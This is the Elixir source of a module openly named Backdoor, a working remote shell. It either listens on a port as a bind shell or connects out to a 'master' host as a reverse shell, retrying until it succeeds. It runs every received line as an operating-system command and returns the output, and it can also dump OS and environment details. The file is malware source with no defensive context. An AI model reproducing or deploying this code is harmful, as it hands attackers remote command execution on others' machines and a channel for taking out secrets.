defmodule Backdoor do
  require Logger
  alias Backdoor.Prompt

  def listen(port) do
    case :gen_tcp.listen(port,
      [:binary, packet: :line, active: false, reuseaddr: true]) do
      {:ok, socket} ->
        Logger.info "Accepting connections on port #{port}"
        loop_listener(socket)
      {:error, reason} ->
        Logger.info(inspect(reason))
        Logger.info "Could not connect to port #{port}"
        Process.sleep(5000)
        listen(port)
    end
  end

  def connect(master, port) do
    case :gen_tcp.connect(master, port,
      [:binary, packet: :line, active: false, reuseaddr: true]) do
        {:ok, socket} ->
          Logger.info "Atempting to connect to #{inspect(master)} on port #{port}"
          loop_connected(socket)
        {:error, reason} ->
          Logger.info(inspect(reason))
          Logger.info "Could not connect to #{inspect(master)} on port #{port}"
          Process.sleep(5000)
          connect(master, port)
      end
  end

  defp loop_connected(socket) do
    ''
    |> Prompt.add_prompt()
    |> write_line(socket)

    Task.start_link(fn -> serve(socket) end)
   # loop_connected(socket)
  end

  defp loop_listener(socket) do
    {:ok, client} = :gen_tcp.accept(socket)
    ''
    |> Prompt.add_prompt()
    |> write_line(client)

    Task.start_link(fn -> serve(client) end)
    loop_listener(socket)
  end

  defp serve(socket) do
    line =
      read_line(socket)
      |> IO.chardata_to_string()
    command = Prompt.remove_newline(line)
    case command do
      "exit" ->
        :ok = :gen_tcp.close(socket)
      "os_info" ->
        Prompt.os_info()
        |> Prompt.add_prompt_string()
        |> write_line(socket)
        serve(socket)
      "env_info" ->
        Prompt.env_info()
        |> Prompt.add_prompt_string()
        |> write_line(socket)
        serve(socket)
      com ->
        String.to_charlist(com)
        |> :os.cmd()
        |> Prompt.add_prompt()
        |> write_line(socket)
        serve(socket)
    end
  end

  defp read_line(socket) do
    case :gen_tcp.recv(socket, 0) do
      {:ok, data} ->
        data
      {:error, reason} ->
        Logger.info(inspect(reason))
        Logger.info "Could not receive"
    end
  end

  defp write_line(line, socket) do
    :gen_tcp.send(socket, line)
  end
end
